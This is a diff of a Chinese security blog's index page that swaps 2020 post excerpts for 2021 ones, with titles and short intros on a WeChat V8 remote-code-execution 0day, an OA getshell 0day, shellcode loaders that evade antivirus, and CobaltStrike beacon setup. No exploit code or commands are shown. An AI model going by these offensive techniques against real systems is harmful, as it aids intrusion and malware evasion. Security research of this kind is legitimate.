@@ -967,8 +813,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T11:09:58+08:00">
-                2020-12-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -999,7 +845,321 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.5k字
+                  128字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p><img src="/img/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/image-20210201110915058.png" alt="image-20210201110915058"></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/06/26/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+		<div>
+		  
+		</div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/%E8%93%9D%E5%87%8COA_0day/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小维同学">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小维的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/06/26/%E8%93%9D%E5%87%8COA_0day/" itemprop="url">蓝凌OA Getshell 0day</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  18字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          该文章已受密码保护, 请您输入密码查看。
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/06/26/%E8%93%9D%E5%87%8COA_0day/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+		<div>
+		  
+		</div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/Wechat-RCE-0day/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小维同学">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小维的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/06/26/Wechat-RCE-0day/" itemprop="url">Wechat RCE 0day</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k字
                 </span>
               
 
@@ -1037,14 +1197,14 @@
 
       
         
-          <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在HTTP请求被Struts2处理时，首先读取<code>web.xml</code>文件，这个是网站配置文件，里面有个过滤器，叫：<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>然后这个过滤器执行完之后，会经过一系列的拦截器，这些拦截器可以是默认的，也是可以用户自定义的。</p>
-<p>Struts2请求处理流程（来自攻击JavaWeb应用[5]）：</p>
-<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225113205710.png" alt="image-20201225113205710"></p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这里科普几个概念</span><br><span class="line">拦截器概念</span><br><span class="line">拦截器(Interceptor)是Struts2框架的核心功能之一,Struts <span class="number">2</span>是一个基于MVC设计模式的开源框架, [<span class="number">3</span>]  主要完成请求参数的解析、将页面表单参数赋给值栈中相应属性、执行功能检验、程序异常调试等工作。Struts2拦截器是一种可插拔策略,实现了面向切面的组件开发,当需要扩展功能时,只需要提供对应拦截器,并将它配置在Struts2容器中即可,如果不需要该功能时,也只需要在配置文件取消该拦截器的设置,整个过程不需要用户添加额外的代码。拦截器中更为重要的概念即拦截器栈(Interceptor Stack),拦截器栈就是Struts2中的拦截器按一定的顺序组成的一个线性链,页面发出请求,访问Action对象或方法时,栈中被设置好的拦截器就会根据堆栈的原理顺序的被调用。 </span><br><span class="line"></span><br><span class="line">说人话：struts2是框架，封装的功能都是在拦截器里面，封装很多功能，有很多拦截器，不是每次这些拦截器都执行，每次执行默认的拦截器，默认拦截器位置struts2-core<span class="number">-2.0</span><span class="number">.8</span>.jar!\struts-<span class="section">default</span>.xml，在执行拦截器，执行过程使用aop思想，在action没有直接调用拦截器方法，而是使用配置文件进行操作，在执行拦截器时候，执行很多的拦截器，这个过程使用责任链模式，例如：执行三个拦截器，执行拦截器<span class="number">1</span>-&gt;执行完放行-&gt;执行拦截器<span class="number">2</span>-&gt;执行完放行-&gt;执行拦截器<span class="number">3</span>-&gt;执行完放行-&gt;执行action方法。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">拦截器什么时候执行呢？</span><br><span class="line">在action对象之后，action方法执行之前</span><br></pre></td></tr></table></figure>
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>该漏洞是Google V8引擎历史漏洞的衍生关联漏洞。微信客户端（Windows版本）使用V8引擎解析JavaScript代码，并关闭了沙盒模式（–no-sandbox参数)。攻击者利用上述漏洞，构造恶意钓鱼链接并通过微信发送，在引诱受害者使用微信客户端（Windows版）点击钓鱼链接后，可获取远程主机的控制权限，实现远程代码执行攻击。</p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>微信PC客户端（Windows）&lt; 3.2.1.141 （注：亲测较低版本可能不存在）</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/24/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/Wechat-RCE-0day/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1097,7 +1257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/14/Vue.js/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -1116,7 +1276,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/14/Vue.js/" itemprop="url">Vue.js 学习笔记</a></h1>
+                <a class="post-title-link" href="/2021/06/26/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/" itemprop="url">WEB批量请求器.md</a></h1>
         
 
         <div class="post-meta">
@@ -1128,8 +1288,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-14T11:42:58+08:00">
-                2020-12-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -1160,7 +1320,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  10字
+                  226字
                 </span>
               
 
@@ -1198,10 +1358,11 @@
 
       
         
-          <iframe id="embed_dom" name="embed_dom" frameborder="0" style="display:block;width:100%; height:600px;" src="https://www.processon.com/view/link/5fd6d7185653bb06f33b70d6"></iframe>
+          <p>本工具仅限技术研究与测试，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>WEB批量请求器（WebBatchRequest）是对目标地址批量进行快速的存活探测、Title获取，简单的banner识别，支持HTTP代理以及可自定义HTTP请求用于批量的漏洞验证等的一款基于JAVA编写的轻量工具。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/14/Vue.js/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1254,7 +1415,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -1273,7 +1434,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/" itemprop="url">Python Shellcode加载器绕过AV</a></h1>
+                <a class="post-title-link" href="/2021/06/26/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/" itemprop="url">VMware 安装黑苹果系统(MacOS)</a></h1>
         
 
         <div class="post-meta">
@@ -1285,8 +1446,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-07T18:22:58+08:00">
-                2020-12-07
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -1317,167 +1478,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.9k字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">免杀技术大致分为有以下几类：</span><br><span class="line">特征码修改</span><br><span class="line">花指令免杀</span><br><span class="line">加壳免杀</span><br><span class="line">内存免杀</span><br><span class="line">二次编译</span><br><span class="line">分离免杀</span><br><span class="line">资源修改</span><br><span class="line">...</span><br><span class="line">Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。</span><br></pre></td></tr></table></figure>
-
-<p>采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。</p>
-<p>主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-		<div>
-		  
-		</div>
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小维同学">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小维的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/" itemprop="url">Cobaltstrike Beacon DNS上线</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-02T10:41:58+08:00">
-                2020-12-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  392字
+                  438字
                 </span>
               
 
@@ -1515,13 +1516,11 @@
 
       
         
-          <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>因为最近捣鼓了一下Cobaltstrike DNS上线，发现网上文章大多数千篇一律(复制粘贴)，形成很多误导。</p>
-<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域名平台：阿里云</span><br><span class="line">CobaltStrike版本：<span class="number">4.1</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><h5 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h5>
+          <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>经常有时候需要测试MAC的一些软件，所以就想着用VM来安装黑苹果来进行一些软件的测试。</p>
+<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">操作系统：Windows <span class="number">10</span> <span class="number">10.0</span><span class="number">.18363</span></span><br><span class="line">VMware版本：VMware® Workstation <span class="number">15</span> Pro <span class="number">15.5</span><span class="number">.2</span> build<span class="number">-15785246</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1574,7 +1573,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/10/20/%E6%9F%90SRC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97Getshell/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/Telnet%20SMTP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -1593,7 +1592,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/10/20/%E6%9F%90SRC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97Getshell/" itemprop="url">某SRC任意文件包含漏洞 包含日志Getshell</a></h1>
+                <a class="post-title-link" href="/2021/06/26/Telnet%20SMTP/" itemprop="url">Telnet 测试邮件协议</a></h1>
         
 
         <div class="post-meta">
@@ -1605,8 +1604,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-20T15:52:58+08:00">
-                2020-10-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -1637,7 +1636,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  14字
+                  1.2k字
                 </span>
               
 
@@ -1653,7 +1652,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1分钟
+                  4分钟
                 </span>
               
             </div>
@@ -1675,10 +1674,13 @@
 
       
         
-          该文章已加密, 请输入密码查看。
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h5 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h5><p><img src="/img/Telnet%20SMTP/image-20210414093817371.png" alt="image-20210414093817371"></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/10/20/%E6%9F%90SRC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97Getshell/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/Telnet%20SMTP/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1731,7 +1733,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/09/28/Unexpected_information_BurpSuite_Extensions/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -1750,7 +1752,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/09/28/Unexpected_information_BurpSuite_Extensions/" itemprop="url">BurpSuite-Extender-Unexpected information</a></h1>
+                <a class="post-title-link" href="/2021/06/26/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/" itemprop="url">Shellcode 隐写像素RGB免杀上线到 CobaltStrike</a></h1>
         
 
         <div class="post-meta">
@@ -1762,8 +1764,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-28T14:04:58+08:00">
-                2020-09-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -1794,7 +1796,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  338字
+                  1.8k字
                 </span>
               
 
@@ -1810,7 +1812,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1分钟
+                  10分钟
                 </span>
               
             </div>
@@ -1832,10 +1834,13 @@
 
       
         
-          <p>最近写了一个BurpSuite Extensions用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。</p>
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>看到一篇推文隐写RGB来进行绕过杀软，记录一下~</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/09/28/Unexpected_information_BurpSuite_Extensions/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1879,7 +1884,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
   </nav>
 
 
@@ -1931,7 +1936,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1953,7 +1958,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2015,7 +2020,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
